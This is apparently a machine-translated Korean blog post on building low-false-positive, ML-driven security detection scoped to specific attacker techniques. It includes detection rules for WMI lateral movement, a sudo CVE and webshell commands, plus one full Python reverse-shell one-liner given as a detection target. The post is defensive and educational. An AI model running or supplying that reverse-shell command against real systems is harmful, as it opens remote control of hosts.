<!DOCTYPE html><html lang="ko"><head><meta charSet="utf-8"/><title>AI-주도 보안 운영 구조에서 낮은 거짓 양성률을 유지하는 방법 | ui-station</title><meta name="description" content=""/><meta name="viewport" content="width=device-width, initial-scale=1.0"/><meta property="og:url" content="https://ui-station.github.io///post/2024-05-20-ArchitectureofAI-DrivenSecurityOperationswithaLowFalsePositiveRate" data-gatsby-head="true"/><meta property="og:type" content="website" data-gatsby-head="true"/><meta property="og:site_name" content="AI-주도 보안 운영 구조에서 낮은 거짓 양성률을 유지하는 방법 | ui-station" data-gatsby-head="true"/><meta property="og:title" content="AI-주도 보안 운영 구조에서 낮은 거짓 양성률을 유지하는 방법 | ui-station" data-gatsby-head="true"/><meta property="og:description" content="" data-gatsby-head="true"/><meta property="og:image" content="/assets/img/2024-05-20-ArchitectureofAI-DrivenSecurityOperationswithaLowFalsePositiveRate_0.png" data-gatsby-head="true"/><meta property="og:locale" content="en_US" data-gatsby-head="true"/><meta name="twitter:card" content="summary_large_image" data-gatsby-head="true"/><meta property="twitter:domain" content="https://ui-station.github.io/" data-gatsby-head="true"/><meta property="twitter:url" content="https://ui-station.github.io///post/2024-05-20-ArchitectureofAI-DrivenSecurityOperationswithaLowFalsePositiveRate" data-gatsby-head="true"/><meta name="twitter:title" content="AI-주도 보안 운영 구조에서 낮은 거짓 양성률을 유지하는 방법 | ui-station" data-gatsby-head="true"/><meta name="twitter:description" content="" data-gatsby-head="true"/><meta name="twitter:image" content="/assets/img/2024-05-20-ArchitectureofAI-DrivenSecurityOperationswithaLowFalsePositiveRate_0.png" data-gatsby-head="true"/><meta name="twitter:data1" content="Dev | ui-station" data-gatsby-head="true"/><meta name="article:published_time" content="2024-05-20 18:11" data-gatsby-head="true"/><meta name="next-head-count" content="19"/><meta name="google-site-verification" content="a-yehRo3k3xv7fg6LqRaE8jlE42e5wP2bDE_2F849O4"/><link rel="stylesheet" href="/favicons/favicon.ico"/><link rel="icon" type="image/png" sizes="16x16" href="/assets/favicons/favicon-16x16.png"/><link rel="icon" type="image/png" sizes="32x32" href="/assets/favicons/favicon-32x32.png"/><link rel="icon" type="image/png" sizes="96x96" href="/assets/favicons/favicon-96x96.png"/><link rel="icon" href="/favicons/apple-icon-180x180.png"/><link rel="apple-touch-icon" href="/favicons/apple-icon-180x180.png"/><link rel="apple-touch-startup-image" href="/startup.png"/><meta name="apple-mobile-web-app-capable" content="yes"/><meta name="apple-mobile-web-app-status-bar-style" content="black"/><meta name="msapplication-config" content="/favicons/browserconfig.xml"/><script async="" src="https://www.googletagmanager.com/gtag/js?id=G-V5DKFTZ6BX"></script><script>window.dataLayer = window.dataLayer || [];
            function gtag(){dataLayer.push(arguments);}
            gtag('js', new Date());
          
            gtag('config', 'G-V5DKFTZ6BX');</script><link rel="preload" href="/_next/static/css/6e57edcf9f2ce551.css" as="style"/><link rel="stylesheet" href="/_next/static/css/6e57edcf9f2ce551.css" data-n-g=""/><link rel="preload" href="/_next/static/css/cd012fc8787133d0.css" as="style"/><link rel="stylesheet" href="/_next/static/css/cd012fc8787133d0.css" data-n-p=""/><noscript data-n-css=""></noscript><script defer="" nomodule="" src="/_next/static/chunks/polyfills-c67a75d1b6f99dc8.js"></script><script src="/_next/static/chunks/webpack-ee6df16fdc6dae4d.js" defer=""></script><script src="/_next/static/chunks/framework-46611630e39cfdeb.js" defer=""></script><script src="/_next/static/chunks/main-cf4a52eec9a970a0.js" defer=""></script><script src="/_next/static/chunks/pages/_app-6fae11262ee5c69b.js" defer=""></script><script src="/_next/static/chunks/75fc9c18-4a646156c659a948.js" defer=""></script><script src="/_next/static/chunks/348-d11c34b645b13f5b.js" defer=""></script><script src="/_next/static/chunks/551-3069cf29fe274aab.js" defer=""></script><script src="/_next/static/chunks/pages/post/%5Bslug%5D-561ae49ab5aab7f5.js" defer=""></script><script src="/_next/static/ll1cGyplNwh83dpggeai1/_buildManifest.js" defer=""></script><script src="/_next/static/ll1cGyplNwh83dpggeai1/_ssgManifest.js" defer=""></script></head><body><div id="__next"><header class="Header_header__Z8PUO"><div class="Header_inner__tfr0u"><strong class="Header_title__Otn70"><a href="/">UI STATION</a></strong><nav class="Header_nav_area__6KVpk"><a class="nav_item" href="/posts/1">Posts</a></nav></div></header><main class="posts_container__NyRU3"><div class="posts_inner__i3n_i"><h1 class="posts_post_title__EbxNx">AI-주도 보안 운영 구조에서 낮은 거짓 양성률을 유지하는 방법</h1><div class="posts_meta__cR7lu"><div class="posts_profile_wrap__mslMl"><div class="posts_profile_image_wrap__kPikV"><img alt="AI-주도 보안 운영 구조에서 낮은 거짓 양성률을 유지하는 방법" loading="lazy" width="44" height="44" decoding="async" data-nimg="1" class="profile" style="color:transparent" src="/favicons/apple-icon-114x114.png"/></div><div class="posts_textarea__w_iKT"><span class="writer">UI STATION</span><span class="posts_info__5KJdN"><span class="posts_date__ctqHI">Posted On May 20, 2024</span><span class="posts_reading_time__f7YPP">11<!-- --> min read</span></span></div></div><img alt="" loading="lazy" width="50" height="50" decoding="async" data-nimg="1" class="posts_view_badge__tcbfm" style="color:transparent" src="https://hits.seeyoufarm.com/api/count/incr/badge.svg?url=https%3A%2F%2Fallround-coder.github.io/post/2024-05-20-ArchitectureofAI-DrivenSecurityOperationswithaLowFalsePositiveRate&amp;count_bg=%2379C83D&amp;title_bg=%23555555&amp;icon=&amp;icon_color=%23E7E7E7&amp;title=views&amp;edge_flat=false"/></div><article class="posts_post_content__n_L6j"><h2>이 기사는 사이버 보안에 적용된 제품 준비 단계의 기계 학습 솔루션 구축에 대한 마인드셋을 논의합니다.</h2>
<p><img src="/assets/img/2024-05-20-ArchitectureofAI-DrivenSecurityOperationswithaLowFalsePositiveRate_0.png" alt="이미지"/></p>
<p>지난 몇 년간, 우리가 수십 년 동안 사용해온 교육 시스템의 품위를 훼손하는 LLMs가 존재하고, AGI로부터 실재적인 공포를 느끼기 시작했음에도 불구하고, 인공 지능(AI) 시스템을 새로운 데이터 과학 도메인에 적용하는 가능성은 먼산 미래적 이정표를 달성하기 어렵고 구별되는 접근이 필요합니다.</p>
<p>이 기사에서는 사이버 보안에 대한 AI 적용 가능성, 대부분의 응용 프로그램이 실패하는 이유, 그리고 실제로 작동하는 방법론에 대해 개념적으로 논의합니다. 가정적으로, 제시된 접근 방식과 결론은 특히 시스템 로그로부터의 추론에 의존하는 낮은 잘못된 양성 요구 사항을 갖는 기타 응용 도메인으로 이전 가능합니다.</p>
<div class="content-ad"></div>
<p>정보 보안에 관련된 데이터에 머신 러닝(ML) 로직을 구현하는 방법은 다루지 않을 것입니다. 이미 다음 기사에서 코드 샘플과 함께 기능적인 구현 방법을 제공했습니다:</p>
<ul>
<li>기업 보안 텔레미터의 Power Law 분포를 기반으로 한 이상 징후 탐지 엔지니어링;</li>
<li>리눅스 auditd 로그에서 TF-IDF 및 해시 인코딩으로 침입 탐지하는 셸 언어 처리;</li>
<li>시스템 로그에 대한 GPT와 유사한 모델 엔지니어링 기술 중 어떤 것이 작동하는가?</li>
</ul>
<h1>서명</h1>
<p>아직도 성숙한 보안 자세의 근간이자 가장 가치 있는 구성 요소는 목표로 하는 시그니처 규칙뿐입니다. 아래에 예시로 나오는 휴리스틱은 우리 방어의 중요한 부분입니다:</p>
<div class="content-ad"></div>
<pre><code class="hljs language-js">parent_process == <span class="hljs-string">&quot;wmiprvse.exe&quot;</span>
&amp;&amp; 
process == <span class="hljs-string">&quot;cmd.exe&quot;</span>
&amp;&amp; 
command_includes (\\<span class="hljs-number">127.0</span><span class="hljs-number">.0</span><span class="hljs-number">.1</span>\<span class="hljs-variable constant_">ADMIN</span>)
</code></pre>
<p>정말이지, 이런 규칙들은 훌륭합니다. 이것은 레드 캐너리가 WMI를 통한 측면 이동 탐지를 위해 impacket과 같은 도구를 사용하여 실현할 수 있는 (간단화된) 논리의 예시일 뿐입니다. 이런 규칙을 절대 끄지 마시고 계속해서 추가해 나가세요!</p>
<p>하지만, 이 방법론에는 결함이 있습니다...</p>
<p>그래서 이러한 이유로 누구나 한번씩은 매직한 &quot;머신 러닝&quot;을 통해 보안 문제를 해결해 주는 솔루션에 자본, 인력, 시간 등의 자원을 투자하는 것입니다. 보통 이것은 투자 대비 수익이 낮은 토끼굴로 보입니다: (1) 보안 분석가들의 대시보드가 크리스마스 트리처럼 빛나게 되고, 상기 그림 1을 고려하세요; (2) 분석가들이 경보 피로를 느끼게 됩니다; (3) 머신 러닝 휴리스틱이 비활성화되거나 무시됩니다.</p>
<div class="content-ad"></div>
<h1>일반적 vs. 특정 휴리스틱</h1>
<p>먼저 좁은 지능과 일반적 지능의 개념에 주의를 기울이고 싶습니다. 이는 직접적으로 보안 휴리스틱에 옮겨집니다.</p>
<p>일반적으로, 지능은 목표를 달성하는 능력입니다. 우리는 &quot;일반화&quot;하고, 달성해야 할 목표에 도달하기 위해 자연선택과 유전적 인섈트에 의해 주도되는 환경에서는 결코 필요하지 않은 목표를 달성할 수 있는 능력을 갖고 있다고 여겨집니다.</p>
<p>일반화가 우리 종족이 세계를 정복할 수 있게 해 줬지만, 일련의 작업에서 우리보다 훨씬 뛰어난 존재들이 있습니다. 예를 들어, 계산기는 폰 노이만 같은 우리보다 똑똑한 사람이 할 수 있는 산술보다 훨씬 더 잘 할 수 있으며, 다람쥐들 (!)은 작년에 숨겨둔 도토리의 위치를 기억하는 데 사람보다 훨씬 뛰어날 수 있습니다.</p>
<div class="content-ad"></div>
<p><img src="/assets/img/2024-05-20-ArchitectureofAI-DrivenSecurityOperationswithaLowFalsePositiveRate_1.png" alt="Architecture of AI-Driven Security Operations with a Low False Positive Rate"/></p>
<p>보안 휴리스틱에 대해 이야기할 수 있습니다. 특정 도구나 CVE에 중점을 둔 규칙들과 더 넓은 기법 집합을 감지하려는 규칙들이 있습니다. 예를 들어, CVE-2019–14287을 악용한 sudo 권한 상승에만 집중한 이 감지 로직을 살펴봅시다.</p>
<pre><code class="hljs language-js"><span class="hljs-title class_">CommandLine</span>|<span class="hljs-attr">contains</span>: <span class="hljs-string">&#x27; -u#&#x27;</span>
</code></pre>
<p>반면에, 웹쉘 감지 규칙(가려진 형태로 복제됨)은 상당히 넓은 논리를 구현하려고 시도합니다.</p>
<div class="content-ad"></div>
<p>ParentImage|endswith:</p>
<ul>
<li>&#x27;/httpd&#x27;</li>
<li>&#x27;/nginx&#x27;</li>
<li>&#x27;/apache2&#x27;
...</li>
</ul>
<p>&amp;&amp;
Image|endswith:</p>
<ul>
<li>&#x27;/whoami&#x27;</li>
<li>&#x27;/ifconfig&#x27;</li>
<li>&#x27;/netstat&#x27;</li>
</ul>
<p>보안 위협을 시각화하기 위해 감지 규칙을 공격적 기법, 도구 및 절차(TTP)의 랜드스케이프에 매핑하는 더 세밀한 행위 휴리스틱을 정의합니다. 위에 있는 인텔리전스 랜드스케이프와 유사하게, 다음과 같이 선언 규칙을 공격적 기법, 도구 및 절차(TTPs)의 랜드스케이프에 매핑하여 보안 포지션을 시각화할 수 있습니다:</p>
<img src="/assets/img/2024-05-20-ArchitectureofAI-DrivenSecurityOperationswithaLowFalsePositiveRate_2.png"/>
<div class="content-ad"></div>
<h1>False-Positives vs. False-Negatives</h1>
<p>슈도 CVE 규칙은 특정 기술 하나만 감지하고 다른 것을 놓치므로 (극히 높은 거짓 부정률) 거짓 음성 비율이 매우 높습니다. 반면에 웹 쉘 규칙은 Kali Linux 아카이브의 공격 기술 및 웹 쉘 도구 세트를 감지할 수 있습니다.</p>
<p>명백한 질문은 - 그렇다면, 왜 우리는 여러 넓은 행동 규칙으로 모든 가능한 TTP를 다루지 않는 것일까요?</p>
<p>왜냐하면 그것들은 거짓 양성을 가져오기 때문입니다... 정말 많이요.</p>
<div class="content-ad"></div>
<p>여기서는 잘못된 긍정 대 잘못된 부정의 트레이드 오프를 관찰합니다.</p>
<p>대부분의 기관은 sudo CVE 규칙을 복사하여 SIEM에서 즉시 활성화할 수 있지만, 웹쉘 규칙은 보안 분석가가 환경에서 관찰된 모든 합법적인 트리거를 걸러내는 동안 &quot;모니터 전용&quot; 모드로 작동할 수 있습니다.</p>
<p>시스템 관리자가 생성한 자동화 알림을 볼 수 있습니다. 이 알림은 REST API 요청을 실행하고 열거 액션 중 하나를 트리거하는지 또는 배포될 때 이상한 부모-자식 프로세스 관계를 만드는 Ansible 셸 스크립트를 실행합니다. 결국 광범위한 행동 규칙이 열 두 가지 제외와 한 달에 두 번 이상의 수정을 통해 목록으로 전환되는 것을 관찰했습니다. 그래서 보안 엔지니어는 규칙의 범위 사이에서 균형을 유지합니다. 일반화의 확대는 비용이 많이든다는 것과 잘못된 긍정의 비율을 최소화하려고 노력합니다.</p>
<h1>보안 휴리스틱으로서의 기계 학습 실패</h1>
<div class="content-ad"></div>
<p>여기 보안 전문가들이 행동 휴리스틱을 구현하는 대체 기술을 찾기 시작합니다. 머신러닝 구현의 요구 사항은 선행적으로 넓습니다. 머신러닝 알고리즘의 적용 가능성을 고려할 때 대부분의 경우 보안 전문가들의 직관은 비지도 학습으로 이끕니다. 우리는 AI에게 네트워크에서 이상을 감지하고, 이상한 명령 라인에 대해 경고하는 등의 작업을 요청합니다. 이러한 작업은 &quot;나를 위해 보안을 해결해줘&quot;라는 일반화 수준에 있습니다. 생산에서 잘 작동하지 않는 것이 놀라운 부분입니다.</p>
<p>실제로 많은 경우 ML은 정확히 우리가 요청한 대로 수행합니다. 예를 들어 IntelliJ가 자신을 업데이트하는 데 사용하는 이상한 elevator.exe 이진 파일을 보고할 수도 있으며, Spotify가 업데이트를 위해 사용하는 새로운 CDN에 대한 경고 또한 동일하게 Command and Control 콜백과 똑같이 랜덤하게 지연될 수 있습니다. 그리고 그 날에 이상했던 수백 가지 유사한 행동들.</p>
<p>감독 학습의 경우에는 대규모의 레이블이 지정된 데이터 집합을 구성할 수 있는 경우(예: 악성 코드 탐지), EMBER와 같이 일반화가 잘 되는 모델링 체계를 구축할 수 있습니다.</p>
<p>그러나 이러한 솔루션들에서도 — 정보 보안의 현대적인 AI 모델조차 아직 &quot;회색&quot; 영역을 파악하기에 충분한 컨텍스트를 보유하고 있지 않습니다. 예를 들어, TeamViewer를 나쁜 것인지 좋은 것인지 고려해야 하는가? 많은 중소기업이 저렴한 VPN으로 사용하고 있습니다. 동시에 이러한 소규모 기업 중 일부는 이러한 도구를 사용하여 대상 네트워크에 백도어로 접근하는 랜섬웨어 그룹일 수도 있습니다.</p>
<div class="content-ad"></div>
<h1>머신 러닝이 보안 휴리스틱으로 성공한 사례</h1>
<p>ML 기반 휴리스틱은 rule-based detection과 같은 이념을 따라야 합니다. 악의적인 TTP 집합에 초점을 맞추어야 합니다. 보안에 AI를 적용하려면 실제로 보안에 대한 지식과 직관이 필요하며, 데이터 과학자분들께 죄송하지만요. ¯_(ツ)_/¯ 적어도 오늘날에는 LLM이 다른 많은 작업에 이어 해결할 수 있는 폭넓은 일반화를 달성할 때까지 보안 문제를 해결할 수 있습니다.</p>
<p>예를 들어, 명령줄에서 이상을 요청하는 대신 (이에 관한 결과가 이 글의 상단 그림 1에 표시된 것처럼 겸손한 크기의 데이터셋에서 634개의 이상으로 나타나는 것), 특정 공격 기법 주변의 베이스라인을 벗어난 활동을 요청해보세요. 즉, 이상한 Python 실행 (T1059.006)을 요청하고 바로 알아내세요! – 동일한 ML 알고리즘, 전처리 및 모델링 기술에 따르면, 실제로 Python 반전 셸인 유일한 이상을 발견할 수 있습니다:</p>
<p><img src="/assets/img/2024-05-20-ArchitectureofAI-DrivenSecurityOperationswithaLowFalsePositiveRate_3.png" alt="image"/></p>
<div class="content-ad"></div>
<p>Unix에 중점을 둔 비지도 학습 기법 예시:</p>
<ul>
<li>이상한 python/perl/ruby 프로세스 (스크립팅 인터프리터를 통한 실행, T1059.006);</li>
<li>이상한 systemd 명령어 (systemd 프로세스를 통한 영속성, T1543.002);</li>
<li>고 심각도 점프박스로의 이상한 ssh 로그인 출처 (T1021.004).</li>
</ul>
<p>Windows에 중점을 둔 비지도 학습 기법 예시:</p>
<ul>
<li>도메인 컨트롤러, MSSQL 서버에 로그인한 사용자의 이상 (T1021.002);</li>
<li>NTDLL.DLL을 로드하는 이상한 프로세스 (T1129);</li>
<li>이상한 RDP 클라이언트 및 서버 조합과의 네트워크 연결 (T1021.001).</li>
</ul>
<div class="content-ad"></div>
<p>기능적인 지도 학습 기준 예시:</p>
<ul>
<li>Reverse shell 모델: 알려진 방법을 활용하여 데이터셋의 악성 부분을 생성하십시오 (이와 같은 생성기에서 영감을 받으세요); 환경 텔레메트리에서 프로세스 생성 이벤트를 사용하여 데이터셋의 합법적인 대응물로 활용하십시오.</li>
<li>강력한 속임수에 대한 규칙을 머릿속에 만드는 대신, 아래의 그림 5에 나온 것과 같이 속임수에 대한 견고성을 고려한 별도의 기계 학습 모델을 구축하십시오 (스포일러: 성공할 수 없습니다). Mandiant의 이 주제에 대한 좋은 기사가 있습니다.</li>
</ul>
<p><img src="/assets/img/2024-05-20-ArchitectureofAI-DrivenSecurityOperationswithaLowFalsePositiveRate_4.png" alt="이미지"/></p>
<h1>기계 학습은 서명 논리의 확장입니다</h1>
<div class="content-ad"></div>
<p>위의 예시들을 체계적으로 정리하면, ML 휴리스틱을 성공적으로 적용하는 데에는 다음 두 단계가 포함됩니다:</p>
<ul>
<li>특정 TTP에서 생성된 텔레메트리를 가능한 정확하게 포착할 수 있도록 입력 데이터를 좁힌 후;</li>
<li>비정상 활동을 찾기 위해 가능한 한 적은 차원을 정의합니다 (예: 프로세스 이미지만 볼 수 있는 논리는 부모 프로세스 이미지와 프로세스 인수를 추가로 볼 때보다 경보를 적게 발생시킵니다).</li>
</ul>
<p>위의 단계 1은 사실 시그니처 규칙을 생성하는 방법입니다.</p>
<p>웹 셸 규칙을 활성화하기 전 &quot;보안 분석가들이 환경을 대표하는 모든 트리거를 걸러낸다&quot;고 이전에 얘기한 것을 기억하나요? 이것이 단계 2입니다.</p>
<div class="content-ad"></div>
<p>과거 사례에서 어떤 사람이 정당한 활동과 악의적인 활동 사이의 의사 결정 경계를 구축합니다. 사실 현대 ML 알고리즘은 여기에 정말 강합니다. ML 휴리스틱은 특정 TTP 주변의 대규모 정당한 활동을 수동으로 걸러내는 부담을 줄일 수 있습니다. 따라서 ML은 더 많은 작업 없이 시그니처 규칙보다 넓은 휴리스틱을 구축할 수 있게 합니다.</p>
<h1>스위스 치즈 모델</h1>
<p>이제 우리는 종합적인 비전을 개요로 설명할 준비가 되었습니다.</p>
<p>전통적인 탐지 엔지니어링 접근 방식은 SOC 대시보드가 넘치지 않도록 가능한 많은 시그니처 규칙을 쌓는 것입니다. 이러한 각 규칙은 높은 거짓 부정률 (FNR)을 가지지만 낮은 거짓 양성률 (FPR)을 가집니다.</p>
<div class="content-ad"></div>
<p>우리는 ML 휴리스틱을 계속 쌓아갈 수 있습니다. 이때 FPR에 대한 요구 사항은 낮아야 합니다. 왜냐하면 유일한 병목 현상을 보호해야 하기 때문입니다: 인간 분석가의 주의력입니다. ML 휴리스틱은 보안 엔지니어의 시간 자원을 크게 고갈시키지 않고 더 일반적인 행동 논리를 도입함으로써 규칙 기반 감지의 틈을 메울 수 있습니다.</p>
<p>만약 대부분의 낮은 hanging fruits를 다루었고 행동 분석에 더 깊게 집중하고 싶다면, 현재 활용 중인 것 위에 딥 러닝 논리를 추가할 수 있습니다.</p>
<p><img src="/assets/img/2024-05-20-ArchitectureofAI-DrivenSecurityOperationswithaLowFalsePositiveRate_5.png" alt="ML heuristics"/></p>
<p>Occam의 면도날 원리를 기억하고, 가능한 간단하게 모든 새로운 휴리스틱을 구현하세요. 신호 규칙이 신뢰할 수 있는 기준선을 정의할 수 없는 경우에만 ML을 사용하십시오.</p>
<div class="content-ad"></div>
<p>예를 들어, 이전에 언급한 이상한 Python 실행과 관련해 — Python 아규먼트는 여전히 환경 내에서 너무 다양할 수 있어서 너무 많은 이상 활동에 대한 경고를 받을 수 있습니다. 더 좁혀서 특정해야 할 수도 있습니다. 예를 들어, 명령줄에 -c가 포함된 프로세스만 캡처하여 Python 바이너리에 인수로 전달된 코드를 찾는 경우에 사용할 수 있습니다. 따라서, 이러한 Python 역술술에만 집중하는 방법을 고려해볼 수 있습니다:</p>
<pre><code class="hljs language-js">python -c <span class="hljs-string">&#x27;import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((&quot;10.10.10.10&quot;,9001));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);import pty; pty.spawn(&quot;sh&quot;)&#x27;</span>
</code></pre>
<p>FPR을 감소시키면 False-Negative가 증가합니다. 따라서, 특이한 이름을 가진 스크립트로부터 Python 실행을 놓칠 수 있습니다. 예를 들어, python fake_server.py와 같이 사용자가 도용한 가짜 서비스를 사용하는 공격자들이 사용할 수 있는 스크립트입니다. 이를 위해 이러한 TTP들의 하위 집합에 중점을 둔 FPR이 낮은 별도의 휴리스틱을 만들어보는 것이 좋을 수 있습니다.</p>
<h1>메타-감지 계층</h1>
<div class="content-ad"></div>
<p>스위스 치즈 방법론을 따라도 상세한 휴리스틱을 얻게 됩니다. 보통 이러한 것들은 악의적인 의도를 나타내는 것은 아니지만 맥락에 관심이 있는 것입니다.</p>
<p>예를 들어, 새 소스에서 고심도 호스트로 SSH/RDP 로그인하는 것은 나쁜 것이 아닙니다(그냥 새 직원이나 워크스테이션일 수 있습니다), 또한 skilled 사용자 중에 whoami /all 실행이 일반적일 수 있습니다. 따라서 이러한 휴리스틱 모두 경보를 직접 트리거하기에 적합하지 않습니다. 그러나 두 가지의 조합은 분석가의 주의를 끌 수 있을지도 모릅니다.</p>
<p>이 딜레마의 해결책은 &quot;True Positive Benigns&quot;를 생성하는 이러한 상세한 규칙 위에 추가적인 논리를 도입하는 것입니다. 우리는 이것을 메타-감지 계층이라고 부를 수 있습니다.</p>
<p><img src="/assets/img/2024-05-20-ArchitectureofAI-DrivenSecurityOperationswithaLowFalsePositiveRate_6.png" alt="아키텍처"/></p>
<div class="content-ad"></div>
<p>룰 활성화 위에 적용되는 메타로직은 다양할 수 있지만 일반적으로 두 단계로 이뤄집니다:</p>
<ul>
<li>&quot;그룹화&quot;: 모든 활성화를 &quot;엔티티&quot;별(예: 호스트, 사용자 이름, 소스 IP, 쿠키 등)로 그룹화합니다.</li>
<li>일정 기간 내의 활성화에 대한 &quot;집계 함수&quot;를 적용합니다.</li>
</ul>
<p>간단하면서도 기능적인 메타 탐지 로직의 예시:</p>
<ul>
<li>단일 엔티티(호스트 또는 사용자와 같은)에서 다른 룰 트리거의 수를 카운트하고, 세 시간 내에 세 가지 이상의 다른 룰이 트리거되면 보고합니다.</li>
<li>위와 동일하나, 심각성을 기준으로 룰에 가중치를 부여하고, &quot;중요&quot; 룰은 3으로, &quot;중간&quot;은 2로, &quot;정보&quot;는 1로 취급하여 임계값을 초과할 경우 보고합니다.</li>
</ul>
<div class="content-ad"></div>
<p>더 정교한 방법들이 존재하는데, 저는 악성 코드 표현에 ML의 두 번째 층을 사용하는 AISec ’22 논문에 정의된 방법을 사용하고 있어요. 이들은 특정 어플리케이션과 환경에 튜닝되어야 해요. 왜냐하면 데이터 세부 정보, 텔레메트리 양 및 인프라 규모에 따라 다른 접근 방식이 필요해요. 이러한 접근 방식은 적절한 경고 한도를 유지하는 데 도움이 돼요.</p>
<h1>결론</h1>
<p>이 기사에서 우리는 시그니처 방식을 넘어서 보안 작업 무기함을 확장하는 사고 방식에 대해 논의했어요. 대부분의 구현은 보안 전문가들이 기계 학습(ML)을 통한 행동 휴리스틱에 너무 광범위한 요구 사항을 정의하기 때문에 제대로 수행하지 못했어요.</p>
<p>우리는 적절한 적용은 공격적인 기술, 전술 및 절차(TTPs)에 의해 이끌어져야 한다고 주장해요. 올바르게 사용될 때, ML 기술은 특정 TTP 주변의 합법적인 활동의 기준을 효율적으로 걸러내는 데 많은 인력을 절약할 수 있어요.</p>
<div class="content-ad"></div>
<p>성숙하고 성공적인 보안 체계는 시그니처와 행동 휴리스틱이 결합된 것으로 구성됩니다. 각각의 별도 검출 논리는 낮은 거짓 긍정률을 갖추고, 거짓 부정을 놓치지 않기 위한 제한 사항은 병렬로 여러 휴리스틱을 적용함으로써 균형을 이룹니다.</p>
<p>이 글에서 사용된 예시는 전통적인 보안 운영에 적용될 경우 감지 엔지니어링 사례를 포함하고 있습니다. 그러나 우리는 같은 방법론이 제한적인 수정을 통해 다른 보안 응용프로그램에서도 유용할 것이라 주장합니다. 예를 들어, EDR/XDR 휴리스틱 공간, 네트워크 트래픽 분석 및 계산 등이 있습니다.</p>
<h1>추가 정보</h1>
<h2>기술 노트: 고정된 거짓 긍정률 하에서 검출률 추정</h2>
<div class="content-ad"></div>
<p>프로덕션 환경에서 행동 ML 휴리스틱 유틸리티를 평가하는 방법에 대한 코드 샘플이 포함된 공지입니다.</p>
<p>데이터 과학자 여러분 — 정확도, F1-스코어 및 AUC와 같은 지표는 보안 솔루션의 프로덕션 준비 상태에 대해 거의 알려주지 않습니다. 이러한 메트릭은 여러 솔루션이 얼마나 유용한지를 추론하는 데 사용될 수 있지만 절대적인 값을 제공하지는 않습니다.</p>
<p>보안 텔레메트리에서 발생하는 베이스 레이트 펄러시 때문에 이렇습니다 — 기본적으로 모델이 볼 수 있는 모든 데이터는 양성 샘플들입니다 (양성 샘플이 아닌 경우를 실제로 가리킴). 따라서 심지어 0.001%의 가짜 양성률이 있더라도 휴리스틱이 매일 10,000개의 확인을 수행한다면 하루에 10건의 경보를 생성할 것입니다.</p>
<p>모델의 유일한 실제 가치는 고정된 가짜 양성률(FPR) 하에서의 탐지율(즉, 실제 양성률, TPR)을 살펴보는 것으로 추정됩니다.</p>
<div class="content-ad"></div>
<p>아래 도표를 살펴봐주세요 — x축은 데이터 샘플의 실제 레이블을 나타냅니다. 이는 악성 또는 양성일 수 있습니다. y축에는 모델의 확률적 예측이 표시됩니다 — 샘플이 얼마나 나쁜 것으로 생각하는지입니다:</p>
<p><img src="/assets/img/2024-05-20-ArchitectureofAI-DrivenSecurityOperationswithaLowFalsePositiveRate_7.png" alt="Plot"/></p>
<p>만약 단 하나의 잘못된 경고만 허용된다면, 모델의 결정 임계값을 약 ~0.75(파선이 그어진 빨간 선)로 설정해야 합니다. 두 번째 잘못된 긍정 값(위양성) 바로 위에 있습니다. 따라서 모델의 현실적인 감지율은 약 50%입니다 (점선이 상자그림의 평균값과 거의 일치합니다).</p>
<p>변경 가능한 위양성율에 따른 감지율 평가는 아래의 코드 예시로 수행할 수 있습니다:</p>
<pre><code class="hljs language-python"><span class="hljs-comment"># 코드 샘플</span>
<span class="hljs-keyword">def</span> <span class="hljs-title function_">evaluate_detection_rates</span>(<span class="hljs-params">y_true, preds</span>):
    <span class="hljs-comment"># 코드 구현 내용</span>
</code></pre></article></div></main></div><script id="__NEXT_DATA__" type="application/json">{"props":{"pageProps":{"post":{"title":"AI-주도 보안 운영 구조에서 낮은 거짓 양성률을 유지하는 방법","description":"","date":"2024-05-20 18:11","slug":"2024-05-20-ArchitectureofAI-DrivenSecurityOperationswithaLowFalsePositiveRate","content":"\n\n## 이 기사는 사이버 보안에 적용된 제품 준비 단계의 기계 학습 솔루션 구축에 대한 마인드셋을 논의합니다.\n\n![이미지](/assets/img/2024-05-20-ArchitectureofAI-DrivenSecurityOperationswithaLowFalsePositiveRate_0.png)\n\n지난 몇 년간, 우리가 수십 년 동안 사용해온 교육 시스템의 품위를 훼손하는 LLMs가 존재하고, AGI로부터 실재적인 공포를 느끼기 시작했음에도 불구하고, 인공 지능(AI) 시스템을 새로운 데이터 과학 도메인에 적용하는 가능성은 먼산 미래적 이정표를 달성하기 어렵고 구별되는 접근이 필요합니다.\n\n이 기사에서는 사이버 보안에 대한 AI 적용 가능성, 대부분의 응용 프로그램이 실패하는 이유, 그리고 실제로 작동하는 방법론에 대해 개념적으로 논의합니다. 가정적으로, 제시된 접근 방식과 결론은 특히 시스템 로그로부터의 추론에 의존하는 낮은 잘못된 양성 요구 사항을 갖는 기타 응용 도메인으로 이전 가능합니다.\n\n\u003cdiv class=\"content-ad\"\u003e\u003c/div\u003e\n\n정보 보안에 관련된 데이터에 머신 러닝(ML) 로직을 구현하는 방법은 다루지 않을 것입니다. 이미 다음 기사에서 코드 샘플과 함께 기능적인 구현 방법을 제공했습니다:\n\n- 기업 보안 텔레미터의 Power Law 분포를 기반으로 한 이상 징후 탐지 엔지니어링;\n- 리눅스 auditd 로그에서 TF-IDF 및 해시 인코딩으로 침입 탐지하는 셸 언어 처리;\n- 시스템 로그에 대한 GPT와 유사한 모델 엔지니어링 기술 중 어떤 것이 작동하는가?\n\n# 서명\n\n아직도 성숙한 보안 자세의 근간이자 가장 가치 있는 구성 요소는 목표로 하는 시그니처 규칙뿐입니다. 아래에 예시로 나오는 휴리스틱은 우리 방어의 중요한 부분입니다:\n\n\u003cdiv class=\"content-ad\"\u003e\u003c/div\u003e\n\n```js\nparent_process == \"wmiprvse.exe\"\n\u0026\u0026 \nprocess == \"cmd.exe\"\n\u0026\u0026 \ncommand_includes (\\\\127.0.0.1\\ADMIN)\n```\n\n정말이지, 이런 규칙들은 훌륭합니다. 이것은 레드 캐너리가 WMI를 통한 측면 이동 탐지를 위해 impacket과 같은 도구를 사용하여 실현할 수 있는 (간단화된) 논리의 예시일 뿐입니다. 이런 규칙을 절대 끄지 마시고 계속해서 추가해 나가세요!\n\n하지만, 이 방법론에는 결함이 있습니다...\n\n그래서 이러한 이유로 누구나 한번씩은 매직한 \"머신 러닝\"을 통해 보안 문제를 해결해 주는 솔루션에 자본, 인력, 시간 등의 자원을 투자하는 것입니다. 보통 이것은 투자 대비 수익이 낮은 토끼굴로 보입니다: (1) 보안 